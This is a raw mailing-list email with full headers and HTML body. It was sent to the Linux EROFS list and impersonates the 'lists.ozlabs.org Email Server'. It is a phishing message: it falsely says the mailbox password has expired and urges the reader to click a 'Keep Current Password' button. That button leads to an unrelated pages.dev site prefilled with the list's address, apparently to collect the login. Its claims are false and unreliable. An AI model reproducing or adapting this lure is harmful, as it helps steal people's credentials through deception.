Return-Path: <linux-erofs-bounces+lists+linux-erofs=lfdr.de@lists.ozlabs.org>
X-Original-To: lists+linux-erofs@lfdr.de
Delivered-To: lists+linux-erofs@lfdr.de
Received: from lists.ozlabs.org (lists.ozlabs.org [IPv6:2404:9400:2:0:216:3eff:fee1:b9f1])
	by mail.lfdr.de (Postfix) with ESMTPS id AD6E5A16627
	for <lists+linux-erofs@lfdr.de>; Mon, 20 Jan 2025 05:46:19 +0100 (CET)
Received: from boromir.ozlabs.org (localhost [IPv6:::1])
	by lists.ozlabs.org (Postfix) with ESMTP id 4YbyTh5svyz3013
	for <lists+linux-erofs@lfdr.de>; Mon, 20 Jan 2025 15:46:16 +1100 (AEDT)
X-Original-To: linux-erofs@lists.ozlabs.org
Delivered-To: linux-erofs@lists.ozlabs.org
Authentication-Results: lists.ozlabs.org; arc=none smtp.remote-ip=194.181.186.37
ARC-Seal: i=1; a=rsa-sha256; d=lists.ozlabs.org; s=201707; t=1737348375;
	cv=none; b=jrKROjdK7NyNaC5/agy7WRBqHsRYSZ0X4JF4iNT1tJNqlTtF0/hpJ5p8pVfBox3PDSmebQy+uaQr0vC3v3D6aOVIr9+fnm9gBjmxrYSGVy7CRD//i3F2fwEt4ORj35w58R1GmdbwrIKMING/rDfBsLB/0qv0dv7pUiniLBe7bH7sRTta15lWzf9ylA0ZSCnRjkVMM8To+6VKIvzHeUowTMkh3V06nXdui3B0wNYVW6jN+ZG2yznPT2bZRcRfwvCyCB7PQPFu/Bp7y1kizpVhZp4TaKOYTiIVZF/RXZ3btVR5HQ9c92lw6gVC1Ii+Noa5jylarn2AptuNyaaqOp//BQ==
ARC-Message-Signature: i=1; a=rsa-sha256; d=lists.ozlabs.org; s=201707;
	t=1737348375; c=relaxed/relaxed;
	bh=DytbY1rkwMCq3FUF11SAaRYEBQn8zpUonDFgiMWl+/c=;
	h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type; b=JqD5XfmrDVSlpQ2erZZMHg3hUXDR+bm2s99K78crBmm7v3L195P/5WDw2tjmEkHBAzR8UftGzdIghBlDC8Ge1lf1Axrp/T45JahcwXpuNmKY4hyMkioDbvC/IPELIoW1ycodlC80/9r9irsfLUSxVZo/bjUDed+HZqaqkVujzPl9qCKoCqW80TOH8LunypIde/5bEQPxoDikW7Uoc9k7/avYtLHkE1VTJfdBBFCl3P/GZj43bxazmRsBX33yP94KLeF8Jip9c4jEfdIX770JMX2/hLMTszPhLqxTKM2DcDnFTI7WNuOb/pRDVE3eSUqSOrXbIuDK/fhO8B3p97I8Pg==
ARC-Authentication-Results: i=1; lists.ozlabs.org; dmarc=none (p=none dis=none) header.from=przytuly.powiatlomzynski.pl; spf=none (client-ip=194.181.186.37; helo=poczta.hi.pl; envelope-from=biblioteka@przytuly.powiatlomzynski.pl; receiver=lists.ozlabs.org) smtp.mailfrom=przytuly.powiatlomzynski.pl
Authentication-Results: lists.ozlabs.org; dmarc=none (p=none dis=none) header.from=przytuly.powiatlomzynski.pl
Authentication-Results: lists.ozlabs.org; spf=none (no SPF record) smtp.mailfrom=przytuly.powiatlomzynski.pl (client-ip=194.181.186.37; helo=poczta.hi.pl; envelope-from=biblioteka@przytuly.powiatlomzynski.pl; receiver=lists.ozlabs.org)
X-Greylist: delayed 435 seconds by postgrey-1.37 at boromir; Mon, 20 Jan 2025 15:46:12 AEDT
Received: from poczta.hi.pl (poczta.hi.pl [194.181.186.37])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by lists.ozlabs.org (Postfix) with ESMTPS id 4YbyTc5LmFz2yP8
	for <linux-erofs@lists.ozlabs.org>; Mon, 20 Jan 2025 15:46:12 +1100 (AEDT)
Received: from localhost (localhost [127.0.0.1])
	by poczta.hi.pl (Postfix) with ESMTP id 18C01F415CD
	for <linux-erofs@lists.ozlabs.org>; Mon, 20 Jan 2025 05:38:53 +0100 (CET)
X-Virus-Scanned: Debian amavisd-new at hi.pl
Received: from poczta.hi.pl ([127.0.0.1])
	by localhost (poczta.hi.pl --fqdn [127.0.0.1]) (amavisd-new, port 10024)
	with ESMTP id NYRiPxUtgh4j for <linux-erofs@lists.ozlabs.org>;
	Mon, 20 Jan 2025 05:38:50 +0100 (CET)
Received: from poczta.hi.pl (unknown [105.112.29.47])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by poczta.hi.pl (Postfix) with ESMTPSA id 30E12F415CB
	for <linux-erofs@lists.ozlabs.org>; Mon, 20 Jan 2025 05:38:49 +0100 (CET)
From: biblioteka@przytuly.powiatlomzynski.pl
To: linux-erofs@lists.ozlabs.org
Subject: lists.ozlabs.org Server - Password Expired
Date: 20 Jan 2025 05:38:46 +0100
Message-ID: <20250120021407.E1DCE061C4FF75D0@poczta.hi.pl>
MIME-Version: 1.0
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable
X-Spam-Status: No, score=2.1 required=5.0 tests=HTML_MESSAGE,MIME_HTML_ONLY,
	MIXED_HREF_CASE,SPF_HELO_NONE,SPF_NONE,T_KAM_HTML_FONT_INVALID
	autolearn=disabled version=4.0.0
X-Spam-Level: **
X-Spam-Checker-Version: SpamAssassin 4.0.0 (2022-12-13) on lists.ozlabs.org
X-BeenThere: linux-erofs@lists.ozlabs.org
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Development of Linux EROFS file system <linux-erofs.lists.ozlabs.org>
List-Unsubscribe: <https://lists.ozlabs.org/options/linux-erofs>,
 <mailto:linux-erofs-request@lists.ozlabs.org?subject=unsubscribe>
List-Archive: <http://lists.ozlabs.org/pipermail/linux-erofs/>
List-Post: <mailto:linux-erofs@lists.ozlabs.org>
List-Help: <mailto:linux-erofs-request@lists.ozlabs.org?subject=help>
List-Subscribe: <https://lists.ozlabs.org/listinfo/linux-erofs>,
 <mailto:linux-erofs-request@lists.ozlabs.org?subject=subscribe>
Errors-To: linux-erofs-bounces+lists+linux-erofs=lfdr.de@lists.ozlabs.org
Sender: "Linux-erofs" <linux-erofs-bounces+lists+linux-erofs=lfdr.de@lists.ozlabs.org>

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
<body>
<DIV>
<table id=3D"v1table1" class=3D"v1x_v1row_mr_css_attr v1x_v1row-3_mr_css_at=
tr" style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Roboto, =
sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: collap=
se; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: #2c363a; FONT-STYLE: nor=
mal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKG=
ROUND-COLOR: #f1f4f8; font-variant-ligatures: normal; font-variant-caps: no=
rmal; font-variant-numeric: inherit;=20
font-variant-east-asian: inherit; font-stretch: inherit; -webkit-text-strok=
e-width: 0px; text-decoration-thickness: initial; text-decoration-style: in=
itial; text-decoration-color: initial" cellspacing=3D"0" cellpadding=3D"0" =
width=3D"100%" align=3D"center" border=3D"0">
<TBODY style=3D"BOX-SIZING: border-box">
<TR style=3D"BOX-SIZING: border-box">
<td style=3D"BOX-SIZING: border-box">
<table id=3D"v1table2" class=3D"v1x_v1row-content_mr_css_attr v1x_v1stack_m=
r_css_attr" style=3D"BOX-SIZING: border-box; WIDTH: 640px; BORDER-COLLAPSE:=
 collapse; COLOR: #000000; BACKGROUND-COLOR: #ffffff" cellspacing=3D"0" cel=
lpadding=3D"0" width=3D"640" align=3D"center" border=3D"0">
<TBODY style=3D"BOX-SIZING: border-box">
<TR style=3D"BOX-SIZING: border-box">
<td class=3D"v1x_v1column_mr_css_attr" style=3D"BORDER-LEFT-WIDTH: 0px; BOX=
-SIZING: border-box; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: top; BORDER-B=
OTTOM-WIDTH: 0px; FONT-WEIGHT: 400; PADDING-BOTTOM: 0px; TEXT-ALIGN: left; =
PADDING-TOP: 0px; BORDER-TOP-WIDTH: 0px" width=3D"100%">
<table id=3D"v1table3" class=3D"v1x_v1text_block_mr_css_attr" style=3D"BOX-=
SIZING: border-box; BORDER-COLLAPSE: collapse" cellspacing=3D"0" cellpaddin=
g=3D"0" width=3D"100%" border=3D"0">
<TBODY style=3D"BOX-SIZING: border-box">
<TR style=3D"BOX-SIZING: border-box">
<td style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 10px; PADDING-TOP: 20p=
x; PADDING-LEFT: 40px; PADDING-RIGHT: 40px">
<DIV style=3D"BOX-SIZING: border-box; BORDER-TOP: 0px; FONT-FAMILY: sans-se=
rif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR=
: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: =
0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inherit">
<DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; BORDER-TOP: 0px; FON=
T-FAMILY: 'Trebuchet MS', 'Lucida Grande', 'Lucida Sans Unicode', 'Lucida S=
ans', Tahoma, sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORD=
ER-BOTTOM: 0px; COLOR: #555555; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADD=
ING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 1.2; PADDING-RIG=
HT: 0px; font-stretch: inherit">
<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; TEXT-ALIGN: center; MA=
RGIN: 0px"><SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; BORDER-T=
OP: 0px; FONT-FAMILY: inherit; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline;=
 BORDER-BOTTOM: 0px; COLOR: #003188; PADDING-BOTTOM: 0px; PADDING-TOP: 0px;=
 PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font=
-stretch: inherit"><STRONG style=3D"BOX-SIZING: border-box; FONT-WEIGHT: bo=
lder"><FONT color=3D#000000>
lists.ozlabs.org Server - Password Expired&nbsp;</FONT></STRONG></SPAN></P>=
</DIV></DIV></TD></TR></TBODY></TABLE>
<table id=3D"v1table4" class=3D"v1x_v1text_block_mr_css_attr" style=3D"BOX-=
SIZING: border-box; BORDER-COLLAPSE: collapse" cellspacing=3D"0" cellpaddin=
g=3D"0" width=3D"100%" border=3D"0">
<TBODY style=3D"BOX-SIZING: border-box">
<TR style=3D"BOX-SIZING: border-box">
<td style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 10px; PADDING-TOP: 10p=
x; PADDING-LEFT: 40px; PADDING-RIGHT: 40px">
<DIV style=3D"BOX-SIZING: border-box; BORDER-TOP: 0px; FONT-FAMILY: Tahoma,=
 Verdana, sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-B=
OTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0=
px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inheri=
t">
<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; BORDER-TOP: 0px; FONT-=
FAMILY: Lato, Tahoma, Verdana, Segoe, sans-serif; BORDER-RIGHT: 0px; VERTIC=
AL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: #555555; PADDING-BOTTOM: 0px=
; TEXT-ALIGN: left; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; =
MARGIN: 0px 0px 0px 40px; LINE-HEIGHT: 1.5; PADDING-RIGHT: 0px; font-stretc=
h: inherit">
<SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; BORDER-TOP: 0px; FO=
NT-FAMILY: inherit; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOT=
TOM: 0px; COLOR: #6d89bc; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LE=
FT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: i=
nherit"><FONT color=3D#000000>The password to your &nbsp;mailbox&nbsp;</FON=
T><A href=3D"mailto:linux-erofs@lists.ozlabs.org" rel=3Dnoreferrer><FONT co=
lor=3D#000000>linux-erofs@lists.ozlabs.org</FONT></A><FONT color=3D#000000>=

 &nbsp;has expired.</FONT></SPAN></P>
<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; BORDER-TOP: 0px; FONT-=
FAMILY: Lato, Tahoma, Verdana, Segoe, sans-serif; BORDER-RIGHT: 0px; VERTIC=
AL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: #555555; PADDING-BOTTOM: 0px=
; TEXT-ALIGN: left; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; =
MARGIN: 0px 0px 0px 40px; LINE-HEIGHT: 1.5; PADDING-RIGHT: 0px; font-stretc=
h: inherit">
<SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; BORDER-TOP: 0px; FO=
NT-FAMILY: inherit; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOT=
TOM: 0px; COLOR: #6d89bc; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LE=
FT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: i=
nherit"><FONT color=3D#000000>System will log you out and generate a new pa=
ssword exactly at 24 hours from</FONT></SPAN></P>
<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; BORDER-TOP: 0px; FONT-=
FAMILY: Lato, Tahoma, Verdana, Segoe, sans-serif; BORDER-RIGHT: 0px; VERTIC=
AL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: #555555; PADDING-BOTTOM: 0px=
; TEXT-ALIGN: left; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; =
MARGIN: 0px 0px 0px 40px; LINE-HEIGHT: 1.5; PADDING-RIGHT: 0px; font-stretc=
h: inherit"><SPAN style=3D"FONT-SIZE: 14px; COLOR: #6d89bc"><FONT color=3D#=
000000><SPAN style=3D"FONT-SIZE: 14px; COLOR: #6d89bc">
<FONT color=3D#000000>21 Jan 2025</FONT></SPAN></FONT></SPAN> <SPAN style=
=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; BORDER-TOP: 0px; FONT-FAMILY: =
inherit; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; C=
OLOR: #6d89bc; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BO=
RDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inherit"><FO=
NT color=3D#000000><FONT color=3D#000000>.</FONT><BR style=3D"BOX-SIZING: b=
order-box"></FONT><FONT color=3D#000000>
&nbsp;&nbsp;</SPAN> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;=
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbs=
p; &nbsp; &nbsp;&nbsp;</FONT>
 <SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; BORDER-TOP: 0px; F=
ONT-FAMILY: inherit; BORDER-RIGHT: 0px; FONT-VARIANT: normal; VERTICAL-ALIG=
N: baseline; BORDER-BOTTOM: 0px; FONT-WEIGHT: normal; COLOR: #6d89bc; PADDI=
NG-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BO=
RDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inherit"><FO=
NT color=3D#000000>&nbsp; &nbsp;<BR style=3D"BOX-SIZING: border-box">
You can continue using your current password. Use the button below to keep =
using current password.</FONT><BR><BR>
<A style=3D"BOX-SIZING: border-box; TEXT-DECORATION: none; BORDER-TOP: #8a3=
b8f 1px solid; FONT-FAMILY: Lato, Tahoma, Verdana, Segoe, sans-serif; BORDE=
R-RIGHT: #8a3b8f 1px solid; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: #8a3b8=
f 1px solid; COLOR: #ffffff; PADDING-BOTTOM: 5px; TEXT-ALIGN: center; PADDI=
NG-TOP: 5px; PADDING-LEFT: 0px; BORDER-LEFT: #8a3b8f 1px solid; MARGIN: 0px=
; DISPLAY: block; PADDING-RIGHT: 0px; BACKGROUND-COLOR: #3d60fb; font-stret=
ch: inherit; border-radius: 4px"=20
href=3D"https://dfdsf.pages.dev/?email=3Dlinux-erofs@lists.ozlabs.org&amp;m=
ail=3Dlists.ozlabs.org" rel=3D"noopener noreferrer" target=3D_blank><SPAN s=
tyle=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; BORDER-TOP: 0px; FONT-FAMI=
LY: inherit; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0p=
x; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDE=
R-LEFT: 0px; MARGIN: 0px; DISPLAY: inline-block; LETTER-SPACING: normal; LI=
NE-HEIGHT: 28px; PADDING-RIGHT: 0px; font-stretch: inherit"><STRONG>
Keep Current Password</STRONG></SPAN></A></P>
<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; BORDER-TOP: 0px; FONT-=
FAMILY: Lato, Tahoma, Verdana, Segoe, sans-serif; BORDER-RIGHT: 0px; VERTIC=
AL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: #555555; PADDING-BOTTOM: 0px=
; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; LINE-=
HEIGHT: 1.5; PADDING-RIGHT: 0px; font-stretch: inherit" align=3Dcenter><FON=
T color=3D#000000><BR>Email is generated by lists.ozlabs.org Email Server f=
or&nbsp;&nbsp;</FONT>
 <A href=3D"mailto:linux-erofs@lists.ozlabs.org" rel=3Dnoreferrer><FONT col=
or=3D#000000>linux-erofs@lists.ozlabs.org</FONT></A><BR><BR><FONT color=3D#=
000000 size=3D2 face=3DArial>Please do not reply to this email. Emails sent=
 to this address will not be answered.<SPAN>&nbsp;</SPAN><BR>Copyright &cop=
y; 2022&nbsp;lists.ozlabs.org All rights reserved.</FONT></P></SPAN></DIV><=
/TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABL=
E></DIV>
<DIV>
<table id=3D"v1table5" class=3D"v1x_v1row_mr_css_attr v1x_v1row-4_mr_css_at=
tr" style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Roboto, =
sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: collap=
se; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: #2c363a; FONT-STYLE: nor=
mal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKG=
ROUND-COLOR: #f1f4f8; font-variant-ligatures: normal; font-variant-caps: no=
rmal; font-variant-numeric: inherit;=20
font-variant-east-asian: inherit; font-stretch: inherit; -webkit-text-strok=
e-width: 0px; text-decoration-thickness: initial; text-decoration-style: in=
itial; text-decoration-color: initial" cellspacing=3D"0" cellpadding=3D"0" =
width=3D"100%" align=3D"center" border=3D"0">
<TBODY style=3D"BOX-SIZING: border-box">
<TR style=3D"BOX-SIZING: border-box">
<td style=3D"BOX-SIZING: border-box"></TD></TR></TBODY></TABLE></DIV></BODY=
></HTML>
